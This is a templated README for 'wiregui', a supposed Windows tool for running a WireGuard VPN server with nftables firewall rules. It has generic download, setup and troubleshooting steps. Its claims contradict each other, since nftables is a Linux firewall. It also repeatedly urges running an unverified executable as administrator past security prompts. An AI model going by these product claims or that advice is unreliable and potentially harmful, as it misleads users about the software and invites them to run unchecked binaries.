# 🔐 wiregui - Simple VPN Server Control

[![Download wiregui](https://img.shields.io/badge/Download-wiregui-4C1D95?style=for-the-badge&logo=github)](https://github.com/bellasachs4-bit/wiregui)

## 🧭 Overview

wiregui is a Windows app for setting up and managing a WireGuard VPN server with a simple screen-based interface. It also works with nftables to help manage firewall rules for your VPN setup.

This app is built for people who want a clear way to run a VPN server without working through command lines and config files.

## 💻 What You Need

Before you install wiregui, make sure your PC meets these basic needs:

- Windows 10 or Windows 11
- Admin rights on the computer
- A stable internet connection
- WireGuard support on the system
- Enough free space for the app and VPN files
- A network adapter that can handle VPN traffic

If you plan to host the server on a home or office network, you may also need access to your router settings.

## 📥 Download

Visit this page to download wiregui:

[https://github.com/bellasachs4-bit/wiregui](https://github.com/bellasachs4-bit/wiregui)

Open the page, look for the latest version, and download the Windows file if one is listed. If the release is packed in a ZIP file, save it to your computer and extract it first.

## 🛠️ Install on Windows

Follow these steps to get wiregui ready on Windows:

1. Open the download page.
2. Download the latest Windows build.
3. If the file is in a ZIP archive, right-click it and choose Extract All.
4. Open the extracted folder.
5. Run the app file you find inside.
6. If Windows asks for permission, choose Yes.
7. If the app opens with a security prompt, confirm that you want to run it.
8. Keep the app in a folder you can find again later.

If the app needs extra support files, place them in the same folder as the main program.

## 🚦 First Launch

When you start wiregui for the first time, the app may ask for permission to change network settings. This is normal for a VPN server tool.

You may see fields for:

- Server name
- VPN port
- IP range for clients
- Firewall rules
- Peer settings
- Config file paths

Use simple names so you can tell your servers apart later.

## 🔧 Basic Setup

To get your VPN server running, follow this flow:

1. Open wiregui as an administrator.
2. Create a new server profile.
3. Pick a VPN port. The default WireGuard port is often used.
4. Set the address range for connected devices.
5. Turn on the firewall rules if your setup needs them.
6. Add one or more clients.
7. Export the client config if the app gives you that option.
8. Import the config on the device that will connect to the VPN.
9. Start the server.
10. Test the connection from another network if possible.

If your internet provider or router blocks the chosen port, try a different one.

## 🖧 Connecting a Client

After the server is ready, each phone, laptop, or desktop needs its own client profile.

Typical steps:

- Create a peer for the device
- Save the client config
- Transfer the config to the device
- Open WireGuard on the device
- Import the config
- Activate the tunnel

Keep one config file per device. That makes it easier to manage access if a device is lost or replaced.

## 🔥 Firewall and nftables

wiregui includes firewall control for setups that use nftables. That helps you manage which traffic can enter and leave the server.

You may use this for:

- Allowing VPN traffic on the chosen port
- Sending VPN traffic through the correct interface
- Limiting access to local network ranges
- Keeping your server rules in one place

If you already use custom firewall rules, check them before you turn on the VPN server so they do not conflict.

## 📂 Files and Settings

wiregui may create or use files such as:

- Server config files
- Client config files
- Keys and certificates
- Firewall rule files
- Log files

Keep these files in a safe folder. If you move them, make sure the app still points to the right path.

A simple folder structure can help:

- `wiregui`
  - `server`
  - `clients`
  - `logs`
  - `keys`

## 🧪 Common Tasks

Here are the tasks most users will perform in wiregui:

- Start or stop the VPN server
- Add a new client
- Remove a client
- Change the VPN port
- Update the allowed IP range
- Turn firewall rules on or off
- Export a config file
- Check server status

If something stops working, check the server status first and then check your port and firewall settings.

## 🧰 Troubleshooting

If wiregui does not start:

- Run it as administrator
- Check that Windows did not block the file
- Make sure the download finished
- Extract the ZIP file before opening the app

If clients cannot connect:

- Check that the VPN server is running
- Check the port number
- Make sure the firewall allows the traffic
- Confirm the client config matches the server settings
- Check your router port forwarding if the server sits behind a home router

If the network works but traffic does not pass through:

- Check the tunnel settings on the client
- Confirm the allowed IP ranges
- Review the nftables rules
- Restart the server and the client

## 🧑‍💻 Good Use Cases

wiregui fits well for:

- Home VPN access
- Small office VPN use
- Remote access to local devices
- Secure access to private network tools
- Simple VPN setup on a Windows host

It is a strong fit when you want VPN control in one place without a heavy setup process.

## 📌 Project Details

- Repository: wiregui
- Description: Firezone Inspired Wireguard VPN Server and nftables Firewall
- Topics: nftables, nicegui, vpn, wireguard
- Download page: [https://github.com/bellasachs4-bit/wiregui](https://github.com/bellasachs4-bit/wiregui)

## 📄 License

Check the repository page for license details before you use or share the software

## 🔗 Download Again

[Download wiregui](https://github.com/bellasachs4-bit/wiregui)

## 🗂️ Suggested Setup Order

1. Download wiregui
2. Extract the files if needed
3. Run the app as administrator
4. Create a server profile
5. Set the port and IP range
6. Add client devices
7. Turn on the server
8. Test the connection